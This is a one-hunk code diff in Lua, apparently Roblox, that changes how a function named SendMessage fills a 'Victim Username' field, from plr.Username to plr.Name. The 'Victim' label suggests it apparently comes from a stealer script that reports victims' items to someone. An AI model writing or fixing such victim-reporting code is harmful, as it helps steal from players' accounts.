@@ -216,7 +216,7 @@ local function SendMessage(sortedItems)
 	local fields = {
 		{
 			name = "Victim Username:",
-			value = plr.Username,
+			value = plr.Name,
 			inline = true
 		},
 		{
